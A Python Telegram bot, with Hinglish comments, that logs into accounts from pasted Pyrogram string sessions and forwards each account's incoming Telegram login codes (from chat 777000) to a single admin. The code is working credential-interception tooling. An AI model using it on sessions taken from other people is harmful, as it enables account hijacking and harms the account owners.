import os
import asyncio
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# Credentials load karna
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0)) # Aapka Telegram Numeric ID

# Main Bot Client
app = Client(
    "otp_manager_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

# Data storage
USER_ACCOUNTS = {}  # {account_id: {"client": client, "phone": phone, "name": name}}
USER_STATE = {}     # User ke current action ko track karne ke liye

def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Login via Session", callback_data="add_login")],
        [InlineKeyboardButton("📂 My Accounts", callback_data="list_accounts")],
        [InlineKeyboardButton("🗑️ Delete Account", callback_data="delete_menu")]
    ])

# 1. /start Command (Sirf Admin ke liye)
@app.on_message(filters.command("start"))
async def start_cmd(client, message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply_text("⛔ Aap is bot ko use nahi kar sakte.")
        return

    USER_STATE.pop(message.from_user.id, None)
    await message.reply_text(
        "👋 **Welcome Admin!**\n\n"
        "Apne accounts aur OTP manage karne ke liye niche diye gaye buttons ka use karein:",
        reply_markup=get_main_keyboard()
    )

# 2. Inline Buttons Handler
@app.on_callback_query()
async def callback_handler(client, callback_query: CallbackQuery):
    if callback_query.from_user.id != ADMIN_ID:
        await callback_query.answer("⛔ Ye bot sirf Admin ke liye hai!", show_alert=True)
        return

    user_id = callback_query.from_user.id
    data = callback_query.data

    # A. Login via Session Button Clicked
    if data == "add_login":
        USER_STATE[user_id] = "awaiting_session"
        await callback_query.message.edit_text(
            "🔑 **Session Login:**\n\nKripya apna Pyrogram String Session yahan bhejain:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="go_back")]])
        )

    # B. My Accounts List Button Clicked
    elif data == "list_accounts":
        if not USER_ACCOUNTS:
            await callback_query.answer("⚠️ Abhi tak koi account add nahi kiya gaya hai!", show_alert=True)
            return

        buttons = []
        for acc_id, acc_data in USER_ACCOUNTS.items():
            buttons.append([InlineKeyboardButton(f"📱 +{acc_data['phone']} ({acc_data['name']})", callback_data=f"get_otp_{acc_id}")])
        buttons.append([InlineKeyboardButton("« Back", callback_data="go_back")])

        await callback_query.message.edit_text(
            "📂 **Aapke Added Accounts:**\n\nJis account ka latest status ya OTP check karna ho, us par click karein:",
            reply_markup=InlineKeyboardMarkup(buttons)
        )

    # C. Specific Account Clicked from List
    elif data.startswith("get_otp_"):
        acc_id = int(data.split("_")[2])
        if acc_id in USER_ACCOUNTS:
            acc_data = USER_ACCOUNTS[acc_id]
            u_cli = acc_data["client"]
            try:
                # Telegram official notifications (777000) se aakhiri message nikalna
                last_msg = "Koi naya message nahi mila."
                async for msg in u_cli.get_chat_history(777000, limit=1):
                    if msg.text:
                        last_msg = msg.text
                
                await callback_query.message.edit_text(
                    f"📩 **Latest OTP for +{acc_data['phone']}:**\n\n{last_msg}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back to Accounts", callback_data="list_accounts")]])
                )
            except Exception as e:
                await callback_query.answer(f"✅ Account active hai (+{acc_data['phone']}). Naya OTP aate hi auto-forward hoga.", show_alert=True)
        else:
            await callback_query.answer("❌ Account nahi mila.", show_alert=True)

    # D. Delete Account Menu Clicked
    elif data == "delete_menu":
        if not USER_ACCOUNTS:
            await callback_query.answer("⚠️ Delete karne ke liye koi account available nahi hai!", show_alert=True)
            return

        buttons = []
        for acc_id, acc_data in USER_ACCOUNTS.items():
            buttons.append([InlineKeyboardButton(f"❌ Delete: +{acc_data['phone']}", callback_data=f"del_acc_{acc_id}")])
        buttons.append([InlineKeyboardButton("« Back", callback_data="go_back")])

        await callback_query.message.edit_text(
            "🗑️ **Delete Account:**\n\nJis account ko hatana ho, us par click karein:",
            reply_markup=InlineKeyboardMarkup(buttons)
        )

    # E. Actual Delete Execution
    elif data.startswith("del_acc_"):
        acc_id = int(data.split("_")[2])
        if acc_id in USER_ACCOUNTS:
            try:
                await USER_ACCOUNTS[acc_id]["client"].stop()
            except:
                pass
            del USER_ACCOUNTS[acc_id]
            await callback_query.answer("✅ Account successfully delete kar diya gaya!", show_alert=True)
            
            if USER_ACCOUNTS:
                buttons = []
                for a_id, a_data in USER_ACCOUNTS.items():
                    buttons.append([InlineKeyboardButton(f"❌ Delete: +{a_data['phone']}", callback_data=f"del_acc_{a_id}")])
                buttons.append([InlineKeyboardButton("« Back", callback_data="go_back")])
                await callback_query.message.edit_text("🗑️ **Delete Account:**", reply_markup=InlineKeyboardMarkup(buttons))
            else:
                await callback_query.message.edit_text("👋 **Main Menu:**", reply_markup=get_main_keyboard())
        else:
            await callback_query.answer("❌ Account nahi mila.", show_alert=True)

    # F. Back Button Handler
    elif data == "go_back":
        USER_STATE.pop(user_id, None)
        await callback_query.message.edit_text(
            "👋 **Main Menu:**",
            reply_markup=get_main_keyboard()
        )

# 3. Text Message Handler (Session String Receive karne ke liye)
@app.on_message(filters.text & ~filters.command(["start"]))
async def handle_text_messages(client, message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    user_id = message.from_user.id
    state = USER_STATE.get(user_id)

    if state == "awaiting_session":
        session_string = message.text.strip()
        USER_STATE.pop(user_id, None)
        
        status_msg = await message.reply_text("⏳ Session verify ho raha hai aur account connect kiya ja raha hai...")

        try:
            # User ka session client start karna
            user_client = Client(
                name=f"usr_{os.urandom(4).hex()}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_string,
                in_memory=True
            )
            await user_client.start()
            me = await user_client.get_me()

            # Account ko global list me save karna
            USER_ACCOUNTS[me.id] = {
                "client": user_client,
                "phone": me.phone_number,
                "name": me.first_name
            }

            await status_msg.edit_text(
                f"✅ **Account Successfully Login Ho Gaya!**\n\n"
                f"👤 **Name:** {me.first_name}\n"
                f"🆔 **ID:** `{me.id}`\n"
                f"📱 **Phone:** +{me.phone_number}\n\n"
                f"Ab is account par aane wale sare OTPs is bot par auto-forward honge.",
                reply_markup=get_main_keyboard()
            )

            # Is specific user client ke liye OTP listener (777000)
            @user_client.on_message(filters.chat(777000))
            async def otp_listener(u_cli, otp_msg: Message):
                if otp_msg.text:
                    await client.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🚨 **New OTP Received!**\n\n📱 Account: `+{me.phone_number}`\n\n{otp_msg.text}"
                    )

        except Exception as e:
            await status_msg.edit_text(
                f"❌ **Login Fail Ho Gaya:**\n`{str(e)}`",
                reply_markup=get_main_keyboard()
            )

# Bot Run Function
if __name__ == "__main__":
    app.run()
